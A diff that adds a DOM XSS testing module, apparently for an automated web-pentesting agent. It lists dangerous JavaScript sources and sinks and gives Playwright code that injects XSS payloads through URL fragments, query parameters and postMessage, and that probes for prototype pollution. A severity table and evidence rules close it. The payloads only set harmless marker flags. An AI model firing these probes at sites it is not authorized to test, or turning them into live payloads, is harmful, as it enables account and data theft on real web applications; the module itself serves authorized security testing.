@@ -1,0 +1,145 @@
+## DOM XSS Deep Testing Methodology
+
+Load this module when: DOM XSS testing is specifically requested, or when SPA frameworks
+are detected and the browser_testing module has been loaded.
+
+This module extends browser_testing with focused DOM XSS attack vectors.
+
+---
+
+### Quick Reference — Dangerous Sources and Sinks
+
+**Sources** (attacker-controlled input):
+- `location.hash`, `location.search`, `location.href`
+- `document.referrer`, `document.URL`, `document.documentURI`
+- `window.name`
+- `postMessage` event data
+- `localStorage` / `sessionStorage` (if attacker can write first)
+- URL parameters parsed by JavaScript (e.g., `new URLSearchParams(location.search)`)
+
+**Sinks** (code execution or DOM mutation):
+- `innerHTML`, `outerHTML`, `insertAdjacentHTML`
+- `document.write()`, `document.writeln()`
+- `eval()`, `Function()`, `setTimeout(string)`, `setInterval(string)`
+- `element.setAttribute("onclick", ...)`, `element.href = "javascript:..."`
+- `jQuery.html()`, `jQuery.append()`, `$()` with HTML string
+- `React.dangerouslySetInnerHTML`, `Vue v-html`, `Angular [innerHTML]`
+
+---
+
+### Test Sequence (use browser_test tool)
+
+#### 1. URL Fragment XSS
+```python
+payloads = [
+    f"{url}#<img src=x onerror=window.__xss_1=1>",
+    f"{url}#\"><script>window.__xss_2=1</script>",
+    f"{url}#javascript:window.__xss_3=1",
+]
+for payload_url in payloads:
+    await page.goto(payload_url)
+    await page.wait_for_timeout(1500)
+    for i in range(1, 4):
+        result = await page.evaluate(f"window.__xss_{i} === 1")
+        if result:
+            print(f"DOM XSS FOUND via URL fragment: {payload_url}")
+```
+
+#### 2. URL Parameter XSS
+```python
+params = ["q", "search", "query", "redirect", "url", "next", "callback", "ref", "page", "id"]
+for param in params:
+    test_url = f"{url}?{param}=<img/src=x onerror=window.__xss_param='{param}'>"
+    await page.goto(test_url)
+    await page.wait_for_timeout(1000)
+    result = await page.evaluate("window.__xss_param")
+    if result:
+        print(f"DOM XSS FOUND via URL parameter '{param}': {test_url}")
+    content = await page.content()
+    if f"onerror=window.__xss_param" in content:
+        print(f"REFLECTED (potentially dangerous) via parameter '{param}'")
+```
+
+#### 3. postMessage XSS
+```python
+await page.goto(url)
+await page.wait_for_timeout(2000)
+# Check if any message listeners exist
+has_listeners = await page.evaluate("""() => {
+    let found = false;
+    const orig = window.addEventListener;
+    window.addEventListener = function(type) {
+        if (type === 'message') found = true;
+        return orig.apply(this, arguments);
+    };
+    return found;
+}""")
+# Try injecting via postMessage
+await page.evaluate("""
+    window.__pm_xss = false;
+    window.postMessage('<img src=x onerror=window.__pm_xss=true>', '*');
+    window.postMessage('{"__proto__": {"polluted": true}}', '*');
+""")
+await page.wait_for_timeout(1000)
+pm_xss = await page.evaluate("window.__pm_xss")
+if pm_xss:
+    print("DOM XSS FOUND via postMessage — message handler renders untrusted HTML")
+```
+
+#### 4. Sink Instrumentation
+```python
+# Must be set before navigation via add_init_script
+await page.add_init_script(\"\"\"
+    window.__sinks = [];
+    const _eval = window.eval;
+    window.eval = function(s) {
+        window.__sinks.push({type:'eval', val:String(s).slice(0,200)});
+        return _eval.call(this, s);
+    };
+    const _write = document.write;
+    document.write = function(s) {
+        window.__sinks.push({type:'document.write', val:String(s).slice(0,200)});
+        return _write.call(document, s);
+    };
+\"\"\")
+await page.goto(url)
+await page.wait_for_timeout(3000)
+sinks = await page.evaluate("window.__sinks || []")
+for s in sinks:
+    print(f"Sink triggered: {s['type']} with value: {s['val'][:100]}")
+```
+
+#### 5. Prototype Pollution
+```python
+pollution_urls = [
+    f"{url}?__proto__[polluted]=true",
+    f"{url}?constructor[prototype][polluted]=true",
+    f"{url}#__proto__[polluted]=true",
+]
+for p_url in pollution_urls:
+    await page.goto(p_url)
+    await page.wait_for_timeout(1000)
+    polluted = await page.evaluate("({}).polluted")
+    if polluted:
+        print(f"PROTOTYPE POLLUTION FOUND: {p_url}")
+```
+
+---
+
+### Severity Mapping
+
+| Finding | Severity | CWE |
+|---------|----------|-----|
+| DOM XSS via URL fragment/param | High | CWE-79 |
+| DOM XSS via postMessage | High | CWE-79 |
+| DOM XSS via document.referrer | High | CWE-79 |
+| Prototype pollution via URL | Medium | CWE-1321 |
+| Prototype pollution via JSON | Medium | CWE-1321 |
+| Unguarded eval/innerHTML sinks | Medium | CWE-79 |
+| Sensitive data in localStorage | Medium | CWE-922 |
+
+### Evidence Requirements
+- Full URL with payload that triggered the finding
+- Screenshot showing reflected content or alert
+- DOM snapshot saved to `/output/dom_xss_evidence.html`
+- Console output with any error messages
